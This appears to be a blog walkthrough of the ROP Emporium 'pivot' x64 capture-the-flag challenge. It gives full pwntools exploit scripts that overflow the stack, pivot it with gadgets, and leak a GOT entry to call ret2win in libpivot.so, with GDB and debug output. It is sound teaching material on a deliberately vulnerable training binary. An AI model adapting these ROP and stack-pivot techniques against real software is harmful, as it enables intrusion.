---
layout: single
title:  "ROP Emporium - Pivot (x64)"
date:   2020-10-17
excerpt: "pivot was a fundamental challenge from the rop emporium that required the pwner to pivot the stack to another location and leak the base address of a shared module and finally invoke a non-imported function. This is a fundamental skill in ROP chaining since in practice, you normally want to invoke non-imported calls from `libc`."
categories:
  - ctf
  - infosec
tags:
  - binary exploitation
  - exploit development
  - defeating non-executable stacks
  - rop chaining
  - aslr
  - stack pivoting
---

## Summary

pivot was a fundamental challenge from the rop emporium that required the pwner to pivot the stack to another location and leak the base address of a shared module and finally invoke a non-imported function. This is a fundamental skill in ROP chaining since in practice, you normally want to invoke non-imported calls from `libc`. You can read more on the challenge [here](https://ropemporium.com/challenge/pivot.html).

## Analyze the Countermeasures

Always analyze binary countermeasures because it will determine our objective for exploiting the binary and what the limitations are. For all my binary exploit development walkthroughs, I will be using [pwntools](http://docs.pwntools.com/en/stable/) which when installed comes with `checksec`. This tool analyzes countermeasures in the binary when it was initially compiled: 

```
$ checksec pivot
[*] '/home/kali/ctf/rop-emporium/pivot/x64/pivot'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
```

The stack is **non-executable**, so we won't be able to redirect the program's execution to memory instructions located on the stack.
It is also notable that `RUNPATH` points to the current working directory. This is because this challenge also came with a `libpivot.so` shared object file that links to the executable upon runtime:

```
$ ldd pivot
        linux-vdso.so.1 (0x00007ffd683e0000)
        libpivot.so => ./libpivot.so (0x00007f9745335000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f9745156000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f9745539000)
```

## The Challenge Layout

This challenge came with a shared object file `libpivot.so` which is linked at runtime:

```
flag.txt  libpivot.so  pivot
```

## A First Glance

Notice how the pivoting address changes each time the executable runs:

```
$ ./pivot
pivot by ROP Emporium
x86_64

Call ret2win() from libpivot
The Old Gods kindly bestow upon you a place to pivot: 0x7fba9ee2af10
Send a ROP chain now and it will land there
> weee
Thank you!

Now please send your stack smash
> cool
Thank you!

Exiting
kali@kali:~/ctf/rop-emporium/pivot/x64$ ./pivot
pivot by ROP Emporium
x86_64

Call ret2win() from libpivot
The Old Gods kindly bestow upon you a place to pivot: 0x7fe2e5fccf10
Send a ROP chain now and it will land there
> weee
Thank you!

Now please send your stack smash
> cool
Thank you!

Exiting
```

The first time we ran the executable, we notice the pivoting address was `0x7fba9ee2af10`.
The second time we ran it, the pivoting address was `0x7fe2e5fccf10`.

### Goals

1. Call `ret2win()` from `libpivot.so`.

## Finding the Crash Offset

After a first glance at the binary, we notice that it accepts input twice. The first time, it asks for a ROP chain, and the second time, it asks for stack smashing.
For now, we are only interested in stack smashing, so we will send some junk for the first input and calculate the offset at which we can control RIP the second time it requsts input.

```python
from pwn import *

# Set the pwntools context
context.arch = 'amd64'
context.log_level = 'debug'

# Project constants
PROCESS = './pivot'
io = process(PROCESS)

# Debugging
gdbscript = ""
pid = gdb.attach(io, gdbscript=gdbscript)

io.clean()
io.sendline(b"A"*128)
io.recvuntil(b"Now please send your stack smash")
io.sendline(cyclic(128))
io.interactive()
```

```
$ python3 exploit.py
[+] Starting local process './pivot' argv=[b'./pivot'] : pid 9338
[*] running in new terminal: /usr/bin/gdb -q  "./pivot" 9338
[DEBUG] Launching a new terminal: ['/usr/bin/x-terminal-emulator', '-e', '/usr/bin/gdb -q  "./pivot" 9338']
[+] Waiting for debugger: Done
[DEBUG] Received 0xae bytes:
    b'pivot by ROP Emporium\n'
    b'x86_64\n'
    b'\n'
    b'Call ret2win() from libpivot\n'
    b'The Old Gods kindly bestow upon you a place to pivot: 0x7ff9dd8f9f10\n'
    b'Send a ROP chain now and it will land there\n'
    b'> '
[DEBUG] Sent 0x81 bytes:
    b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n'
[DEBUG] Received 0x2f bytes:
    b'Thank you!\n'
    b'\n'
    b'Now please send your stack smash\n'
    b'> '
[DEBUG] Sent 0x81 bytes:
    b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaab\n'
[*] Switching to interactive mode
```

Let's find what RSP points to in GDB determine the offset:

```
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0xb               
$rbx   : 0x0               
$rcx   : 0x00007ff9dd9ecff3  →  0x5577fffff0003d48 ("H="?)
$rdx   : 0x0               
$rsp   : 0x00007fff9d70da48  →  0x6161616c6161616b ("kaaalaaa"?)
$rbp   : 0x6161616a61616169 ("iaaajaaa"?)
$rsi   : 0x00007ff9ddabd723  →  0xabf670000000000a
$rdi   : 0x00007ff9ddabf670  →  0x0000000000000000
$rip   : 0x00000000004009a7  →  <pwnme+182> ret 
$r8    : 0xb               
$r9    : 0x2               
$r10   : 0x0000000000400b34  →  0x6b6e61685400203e ("> "?)
$r11   : 0x246             
$r12   : 0x0000000000400760  →  <_start+0> xor ebp, ebp
$r13   : 0x0               
$r14   : 0x0               
$r15   : 0x0               
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fff9d70da48│+0x0000: 0x6161616c6161616b   ← $rsp
0x00007fff9d70da50│+0x0008: 0x6161616e6161616d
0x00007fff9d70da58│+0x0010: 0x616161706161616f
0x00007fff9d70da60│+0x0018: 0x00000000004009d0  →  <__libc_csu_init+0> push r15
0x00007fff9d70da68│+0x0020: 0x00007ff9dd924cca  →  <__libc_start_main+234> mov edi, eax
0x00007fff9d70da70│+0x0028: 0x00007fff9d70db58  →  0x00007fff9d70e40b  →  0x00746f7669702f2e ("./pivot"?)
0x00007fff9d70da78│+0x0030: 0x0000000100000000
0x00007fff9d70da80│+0x0038: 0x0000000000400847  →  <main+0> push rbp
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4009a0 <pwnme+175>      call   0x4006e0 <puts@plt>
     0x4009a5 <pwnme+180>      nop    
     0x4009a6 <pwnme+181>      leave  
 →   0x4009a7 <pwnme+182>      ret    
[!] Cannot disassemble from $PC
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "pivot", stopped 0x4009a7 in pwnme (), reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4009a7 → pwnme()
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤ 
```

RSP points to `kaaa` which means that we can control RIP at offset 40 in the buffer:

```
$ cyclic -l kaaa
40
```

## Restricted Stack Space

For this challenge, it is also important to notice that we have **limited stack space**.
After running the exploit another time, let's examine the stack contents just before the crash:

```
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0xb               
$rbx   : 0x0               
$rcx   : 0x00007f1feae67ff3  →  0x5577fffff0003d48 ("H="?)
$rdx   : 0x0               
$rsp   : 0x00007ffc1f3419e8  →  0x6161616c6161616b ("kaaalaaa"?)
$rbp   : 0x6161616a61616169 ("iaaajaaa"?)
$rsi   : 0x00007f1feaf38723  →  0xf3a670000000000a
$rdi   : 0x00007f1feaf3a670  →  0x0000000000000000
$rip   : 0x00000000004009a7  →  <pwnme+182> ret 
$r8    : 0xb               
$r9    : 0x2               
$r10   : 0x0000000000400b34  →  0x6b6e61685400203e ("> "?)
$r11   : 0x246             
$r12   : 0x0000000000400760  →  <_start+0> xor ebp, ebp
$r13   : 0x0               
$r14   : 0x0               
$r15   : 0x0               
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffc1f3419e8│+0x0000: 0x6161616c6161616b   ← $rsp
0x00007ffc1f3419f0│+0x0008: 0x6161616e6161616d
0x00007ffc1f3419f8│+0x0010: 0x616161706161616f
0x00007ffc1f341a00│+0x0018: 0x00000000004009d0  →  <__libc_csu_init+0> push r15
0x00007ffc1f341a08│+0x0020: 0x00007f1fead9fcca  →  <__libc_start_main+234> mov edi, eax
0x00007ffc1f341a10│+0x0028: 0x00007ffc1f341af8  →  0x00007ffc1f34240b  →  0x00746f7669702f2e ("./pivot"?)
0x00007ffc1f341a18│+0x0030: 0x0000000100000000
0x00007ffc1f341a20│+0x0038: 0x0000000000400847  →  <main+0> push rbp
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4009a0 <pwnme+175>      call   0x4006e0 <puts@plt>
     0x4009a5 <pwnme+180>      nop    
     0x4009a6 <pwnme+181>      leave  
 →   0x4009a7 <pwnme+182>      ret    
[!] Cannot disassemble from $PC
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "pivot", stopped 0x4009a7 in pwnme (), reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4009a7 → pwnme()
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/32xg $rsp
0x7ffc1f3419e8: 0x6161616c6161616b      0x6161616e6161616d
0x7ffc1f3419f8: 0x616161706161616f      0x00000000004009d0
0x7ffc1f341a08: 0x00007f1fead9fcca      0x00007ffc1f341af8
0x7ffc1f341a18: 0x0000000100000000      0x0000000000400847
0x7ffc1f341a28: 0x00007f1fead9f7d9      0x0000000000000000
0x7ffc1f341a38: 0x2816d8a63d046d56      0x0000000000400760
0x7ffc1f341a48: 0x0000000000000000      0x0000000000000000
0x7ffc1f341a58: 0x0000000000000000      0xd7eee64e1a846d56
0x7ffc1f341a68: 0xd6290d95d7a26d56      0x0000000000000000
0x7ffc1f341a78: 0x0000000000000000      0x0000000000000000
0x7ffc1f341a88: 0x0000000000000001      0x00007ffc1f341af8
0x7ffc1f341a98: 0x00007ffc1f341b08      0x00007f1feb188180
0x7ffc1f341aa8: 0x0000000000000000      0x0000000000000000
0x7ffc1f341ab8: 0x0000000000400760      0x00007ffc1f341af0
0x7ffc1f341ac8: 0x0000000000000000      0x0000000000000000
0x7ffc1f341ad8: 0x000000000040078a      0x00007ffc1f341ae8
```

Notice how the last characters in our buffer on the stack are `0x616161706161616f`.
This means that we only have three memory addresses (0x18 bytes) to work with in our ROP chain.

For the curious, we can translate those bytes from little endian with `pwntools`:

```
$ python3
Python 3.8.5 (default, Aug  2 2020, 15:09:07) 
[GCC 10.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> foo = p64(0x616161706161616f)
>>> foo
b'oaaapaaa'
>>> 
```

Examining our cyclic pattern, we can see that our pattern got truncated just before `qaaa`:

```
$ echo -n aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaab | xxd
00000000: 6161 6161 6261 6161 6361 6161 6461 6161  aaaabaaacaaadaaa
00000010: 6561 6161 6661 6161 6761 6161 6861 6161  eaaafaaagaaahaaa
00000020: 6961 6161 6a61 6161 6b61 6161 6c61 6161  iaaajaaakaaalaaa
00000030: 6d61 6161 6e61 6161 6f61 6161 7061 6161  maaanaaaoaaapaaa
00000040: 7161 6161 7261 6161 7361 6161 7461 6161  qaaaraaasaaataaa
00000050: 7561 6161 7661 6161 7761 6161 7861 6161  uaaavaaawaaaxaaa
00000060: 7961 6161 7a61 6162 6261 6162 6361 6162  yaaazaabbaabcaab
00000070: 6461 6162 6561 6162 6661 6162 6761 6162  daabeaabfaabgaab
```

## Treasure Hunting

Let's search for interesting symbols in the the binary with `radare2`:

```
[0x00400760]> is
[Symbols]

nth paddr       vaddr      bind   type   size lib name
――――――――――――――――――――――――――――――――――――――――――――――――――――――
... CONTENT SNIPPED ...
38   0x000009bb 0x004009bb LOCAL  NOTYPE 0        usefulGadgets
... CONTENT SNIPPED ...
```

Now, let's seek the `usefulGadgets` symbol and dump 16 instructions:

```
[0x00400760]> s 0x004009bb
[0x004009bb]> pd 16
            ;-- usefulGadgets:
            0x004009bb      58             pop rax
            0x004009bc      c3             ret
            0x004009bd      4894           xchg rax, rsp
            0x004009bf      c3             ret
            0x004009c0      488b00         mov rax, qword [rax]
            0x004009c3      c3             ret
            0x004009c4      4801e8         add rax, rbp
            0x004009c7      c3             ret
            0x004009c8      0f1f84000000.  nop dword [rax + rax]
... CONTENT SNIPPED ...
```

From here, we should be able to redirect the stack pointer (`RSP`) to a location specified by `RAX`.
We have full control over the `RAX` register since we have access to the `pop rax; ret;` gadget at `0x004009bb`.

Therefore, we can try pointing `RAX` to the leaked stack address so we can have more space for our ROP chain!

## Pivoting the Stack

The code below reads the leaked stack address and sends a small ROP chain to pivot the stack pointer to a location in memory
where we can resume execution from a larger ROP chain. We do this because after smashing the stack, we only
had `0x18` bytes of memory left for our pivoting chain.

If you are following along, I also set a breakpoint so that you can analyze the pivoting chain's execution in GDB.

```python
import binascii
from pwn import *

# Set the pwntools context
context.arch = 'amd64'
context.log_level = 'debug'

# Project constants
PROCESS = './pivot'
io = process(PROCESS)

# Debugging
gdbscript = "b *0x4009a7"
pid = gdb.attach(io, gdbscript=gdbscript)

# Get the leaked pivot address
io.recvuntil(b"The Old Gods kindly bestow upon you a place to pivot: 0x")
raw_pivot_addr = io.recvline().strip().rjust(16, b"0")
pivot_addr = u64(binascii.unhexlify(raw_pivot_addr), endian='big')
info(f'Stack pivoting address at {hex(pivot_addr)}')

# Stack pivoting gadgets
pop_rax_ret = p64(0x004009bb)
xchg_rax_rsp_ret = p64(0x004009bd)

# Make the stack smashing payload to pivot to the ROP chain
# This will point RSP to the location where our ROP chain resides.
offset = 40
padding = b"A" * offset
stack_smash = b"".join([
    padding,
    pop_rax_ret,
    p64(pivot_addr),
    xchg_rax_rsp_ret
])

# Verify that we can redirect the program's execution to the pivoted address
rip = p64(0xdeadbeef)

# Send the ROP chain
io.sendline(rip)

# Smash the stack
io.recvuntil(b"Now please send your stack smash")
io.sendline(stack_smash)
io.interactive()
```

```
$ python3 exploit.py
[+] Starting local process './pivot' argv=[b'./pivot'] : pid 2639
[DEBUG] Wrote gdb script to '/tmp/pwnulahryo7.gdb'
    b *0x4009a7
[*] running in new terminal: /usr/bin/gdb -q  "./pivot" 2639 -x /tmp/pwnulahryo7.gdb
[DEBUG] Launching a new terminal: ['/usr/bin/x-terminal-emulator', '-e', '/usr/bin/gdb -q  "./pivot" 2639 -x /tmp/pwnulahryo7.gdb']
[+] Waiting for debugger: Done
[DEBUG] Received 0xae bytes:
    b'pivot by ROP Emporium\n'
    b'x86_64\n'
    b'\n'
    b'Call ret2win() from libpivot\n'
    b'The Old Gods kindly bestow upon you a place to pivot: 0x7f95a1ee5f10\n'
    b'Send a ROP chain now and it will land there\n'
    b'> '
[*] Stack pivoting address at 0x7f95a1ee5f10
[DEBUG] Sent 0x9 bytes:
    00000000  ef be ad de  00 00 00 00  0a                        │····│····│·│
    00000009
[DEBUG] Received 0x2f bytes:
    b'Thank you!\n'
    b'\n'
    b'Now please send your stack smash\n'
    b'> '
[DEBUG] Sent 0x41 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000020  41 41 41 41  41 41 41 41  bb 09 40 00  00 00 00 00  │AAAA│AAAA│··@·│····│
    00000030  10 5f ee a1  95 7f 00 00  bd 09 40 00  00 00 00 00  │·_··│····│··@·│····│
    00000040  0a                                                  │·│
    00000041
[*] Switching to interactive mode

> [DEBUG] Received 0xb bytes:
    b'Thank you!\n'
Thank you!
```

Let's examine the output in GDB below:

```
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00007ffcafae2190  →  0x00000000004009d0  →  <__libc_csu_init+0> push r15
$rbx   : 0x0               
$rcx   : 0x00007f95a1fd8ff3  →  0x5577fffff0003d48 ("H="?)
$rdx   : 0x0               
$rsp   : 0x00007f95a1ee5f18  →  0x000000000000000a
$rbp   : 0x4141414141414141 ("AAAAAAAA"?)
$rsi   : 0x00007f95a20a9723  →  0x0ab670000000000a
$rdi   : 0x00007f95a20ab670  →  0x0000000000000000
$rip   : 0xdeadbeef        
$r8    : 0xb               
$r9    : 0x2               
$r10   : 0x0000000000400b34  →  0x6b6e61685400203e ("> "?)
$r11   : 0x246             
$r12   : 0x0000000000400760  →  <_start+0> xor ebp, ebp
$r13   : 0x0               
$r14   : 0x0               
$r15   : 0x0               
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007f95a1ee5f18│+0x0000: 0x000000000000000a   ← $rsp
0x00007f95a1ee5f20│+0x0008: 0x0000000000000000
0x00007f95a1ee5f28│+0x0010: 0x0000000000000000
0x00007f95a1ee5f30│+0x0018: 0x0000000000000000
0x00007f95a1ee5f38│+0x0020: 0x0000000000000000
0x00007f95a1ee5f40│+0x0028: 0x0000000000000000
0x00007f95a1ee5f48│+0x0030: 0x0000000000000000
0x00007f95a1ee5f50│+0x0038: 0x0000000000000000
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0xdeadbeef
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "pivot", stopped 0xdeadbeef in ?? (), reason: SINGLE STEP
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  
```

Excellent! It looks like we have successfully pivoted the stack poitner to a location (`0xdeadbeef`) where we can place a larger ROP chain!

## Calling ret2win()

After analyzing the `pivot` binary, we notice it does not import the `ret2win()` function.
However, the `ret2win()` function is defined in the `libpivot.so` shared object file which means we need a way to invoke that address!

```
$ r2 libpivot.so
[0x00000890]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for objc references
[x] Check for vtables
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information
[x] Use -AA or aaaa to perform additional experimental analysis.
```

```
[0x00000890]> afl
... CONTENT SNIPPED ...
0x0000096a    1 19           sym.foothold_function
0x00000a81    3 146          sym.ret2win
... CONTENT SNIPPED ...
```

Since `libpivot.so` is linked upon runtime, we need a way to leak the base address at which this module is loaded.
We need to do this because modern operating systems almost always have **ASLR (Address Space Layout Randomization)** enabled which randomizes the base addresses at which modules are loaded.

Consider the following:

```
$ ldd pivot
        linux-vdso.so.1 (0x00007ffc5f530000)
        libpivot.so => ./libpivot.so (0x00007fc0def5f000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fc0ded80000)
        /lib64/ld-linux-x86-64.so.2 (0x00007fc0df163000)
```

```
$ ldd pivot
        linux-vdso.so.1 (0x00007fffba3e0000)
        libpivot.so => ./libpivot.so (0x00007f8e80030000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f8e7fe51000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f8e80234000)
```

Notice how in both instances, `libpivot.so` was loaded at a different base address.

Now, let's analyze the `pivot` ELF file:

```
$ r2 pivot
[0x00400760]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for objc references
[x] Check for vtables
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information
[x] Use -AA or aaaa to perform additional experimental analysis.
```

And look at the imported functions:

```
[0x00400760]> ii
[Imports]
nth vaddr      bind   type   lib name
―――――――――――――――――――――――――――――――――――――
1   0x004006d0 GLOBAL FUNC       free
2   0x004006e0 GLOBAL FUNC       puts
3   0x004006f0 GLOBAL FUNC       printf
4   0x00400700 GLOBAL FUNC       memset
5   0x00400710 GLOBAL FUNC       read
6   0x00000000 GLOBAL FUNC       __libc_start_main
7   0x00000000 WEAK   NOTYPE     __gmon_start__
8   0x00400720 GLOBAL FUNC       foothold_function
9   0x00400730 GLOBAL FUNC       malloc
10  0x00400740 GLOBAL FUNC       setvbuf
11  0x00400750 GLOBAL FUNC       exit
```

Since `foothold_function` is an import from `libpivot.so`, we can leak the dynamic entry to `foothold_function` in the **GOT (Global Offset Table)**.
However, to populate the `foothold_function` entry in the GOT, the program first needs to have invoked it.
After leaking the location of the `foothold_function` GOT entry, we can use the offset at which `ret2win` is located in `libpivot.so` to calculate the absolute memory location of `ret2win` in the executable's runtime.

The code below is updated with a ROP chain that satisfies all the criteria above.
You may notice that most gadgets are from the `usefulGadgets` symbol in `pivot`.
However, it takes more ROP gadgets to properly implement a ROP chain that will eventuall call `ret2win`.

If you wish to analyze the ROP chains in action, you can uncomment the debugging section in the code.

```python
import binascii
from pwn import *

# Set the pwntools context
context.arch = 'amd64'
context.log_level = 'debug'

# Project constants
PROCESS = './pivot'
io = process(PROCESS)

# Debugging
'''
gdbscript = "b *0x4009a7"
pid = gdb.attach(io, gdbscript=gdbscript)
'''

# ROP Gadgets
pop_rax_ret = p64(0x004009bb)       # pop rax; ret;
xchg_rax_rsp_ret = p64(0x004009bd)  # xchg rax, rsp; ret;
mov_rax_mrax = p64(0x004009c0)      # mov rax, qword [rax]; ret;
add_rax_rbp = p64(0x004009c4)       # add rax, rbp; ret;
pop_rbp_ret = p64(0x00400829)       # pop rbp; ret;
call_rax = p64(0x004006b0)          # call rax; ret;

# Get the leaked pivot address
io.recvuntil(b"The Old Gods kindly bestow upon you a place to pivot: 0x")
raw_pivot_addr = io.recvline().strip().rjust(16, b"0")
pivot_addr = u64(binascii.unhexlify(raw_pivot_addr), endian='big')
info(f'Stack pivoting address at {hex(pivot_addr)}')

# Make the stack smashing payload to pivot to the ROP chain
# This will point RSP to the location where our ROP chain resides.
offset = 40
padding = b"A" * offset
stack_smash = b"".join([
    padding,
    pop_rax_ret,
    p64(pivot_addr),
    xchg_rax_rsp_ret
])

# ROP Chain that calculates the offset of ret2win relative to where foothold_function's GOT entry points to.
libpivot = ELF("./libpivot.so")
ret2win_offset = p64(libpivot.sym['ret2win'] - libpivot.sym['foothold_function'])
foothold_function_plt = p64(io.elf.plt['foothold_function'])
foothold_function_got = p64(io.elf.got['foothold_function'])

rop_chain = b"".join([
    foothold_function_plt, # Calculate the address of ret2win relative to foothold_function in libpivot.so with x64 assembly
    pop_rax_ret,           # Set RAX to the pointer to the GOT foothold_function
    foothold_function_got,
    pop_rbp_ret,           # Set RBP to the ret2win offset
    ret2win_offset,
    mov_rax_mrax,          # Set RAX to the GOT foothold_function
    add_rax_rbp,           # Add the offset to the GOT foothold_function
    call_rax               # Call ret2win
])

# Send the ROP chain
io.sendline(rop_chain)

# Smash the stack
io.recvuntil(b"Now please send your stack smash")
io.sendline(stack_smash)
io.recvall()
```

```
$ python3 exploit.py
[+] Starting local process './pivot' argv=[b'./pivot'] : pid 2916
[DEBUG] Received 0xae bytes:
    b'pivot by ROP Emporium\n'
    b'x86_64\n'
    b'\n'
    b'Call ret2win() from libpivot\n'
    b'The Old Gods kindly bestow upon you a place to pivot: 0x7f229c51ef10\n'
    b'Send a ROP chain now and it will land there\n'
    b'> '
[*] Stack pivoting address at 0x7f229c51ef10
[DEBUG] PLT 0x830 puts
[DEBUG] PLT 0x840 fclose
[DEBUG] PLT 0x850 fgets
[DEBUG] PLT 0x860 fopen
[DEBUG] PLT 0x870 exit
[DEBUG] PLT 0x880 __cxa_finalize
[*] '/home/kali/ctf/rop-emporium/pivot/x64/libpivot.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[DEBUG] PLT 0x4006d0 free
[DEBUG] PLT 0x4006e0 puts
[DEBUG] PLT 0x4006f0 printf
[DEBUG] PLT 0x400700 memset
[DEBUG] PLT 0x400710 read
[DEBUG] PLT 0x400720 foothold_function
[DEBUG] PLT 0x400730 malloc
[DEBUG] PLT 0x400740 setvbuf
[DEBUG] PLT 0x400750 exit
[*] '/home/kali/ctf/rop-emporium/pivot/x64/pivot'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
[DEBUG] PLT 0x4006d0 free
[DEBUG] PLT 0x4006e0 puts
[DEBUG] PLT 0x4006f0 printf
[DEBUG] PLT 0x400700 memset
[DEBUG] PLT 0x400710 read
[DEBUG] PLT 0x400720 foothold_function
[DEBUG] PLT 0x400730 malloc
[DEBUG] PLT 0x400740 setvbuf
[DEBUG] PLT 0x400750 exit
[DEBUG] Sent 0x41 bytes:
    00000000  20 07 40 00  00 00 00 00  bb 09 40 00  00 00 00 00  │ ·@·│····│··@·│····│
    00000010  40 10 60 00  00 00 00 00  29 08 40 00  00 00 00 00  │@·`·│····│)·@·│····│
    00000020  17 01 00 00  00 00 00 00  c0 09 40 00  00 00 00 00  │····│····│··@·│····│
    00000030  c4 09 40 00  00 00 00 00  b0 06 40 00  00 00 00 00  │··@·│····│··@·│····│
    00000040  0a                                                  │·│
    00000041
[DEBUG] Received 0x2f bytes:
    b'Thank you!\n'
    b'\n'
    b'Now please send your stack smash\n'
    b'> '
[DEBUG] Sent 0x41 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000020  41 41 41 41  41 41 41 41  bb 09 40 00  00 00 00 00  │AAAA│AAAA│··@·│····│
    00000030  10 ef 51 9c  22 7f 00 00  bd 09 40 00  00 00 00 00  │··Q·│"···│··@·│····│
    00000040  0a                                                  │·│
    00000041
[+] Receiving all data: Done (129B)
[DEBUG] Received 0x5d bytes:
    b'Thank you!\n'
    b'foothold_function(): Check out my .got.plt entry to gain a foothold into libpivot\n'
[DEBUG] Received 0x21 bytes:
    b'ROPE{a_placeholder_32byte_flag!}\n'
[*] Process './pivot' stopped with exit code 0 (pid 2916)
```

And we get the flag: `ROPE{a_placeholder_32byte_flag!}`
